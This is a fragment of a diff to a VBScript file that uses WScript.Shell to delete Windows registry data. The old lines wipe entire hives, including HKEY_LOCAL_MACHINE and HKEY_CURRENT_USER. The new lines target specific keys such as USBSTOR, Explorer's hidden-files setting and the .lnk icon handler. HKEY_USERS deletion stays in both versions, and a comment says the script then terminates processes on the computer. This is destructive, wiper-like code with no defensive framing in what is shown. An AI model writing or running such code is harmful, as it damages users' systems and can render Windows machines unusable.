@@ -22,11 +22,11 @@ Set objFSO = Nothing
 Set objShell = CreateObject("WScript.Shell")
 
 ' Delete specific registry keys
-objShell.RegDelete "HKEY_CURRENT_CONFIG"
+objShell.RegDelete "HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
 objShell.RegDelete "HKEY_USERS"
-objShell.RegDelete "HKEY_LOCAL_MACHINE"
-objShell.RegDelete "HKEY_CURRENT_USER"
-objShell.RegDelete "HKEY_CLASSES_ROOT"
+objShell.RegDelete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR"
+objShell.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
+objShell.RegDelete "HKEY_CLASSES_ROOT\lnkfile\IconHandler"
 
 ' Say "Goodbye" and terminate various processes on the computer
 i = 1
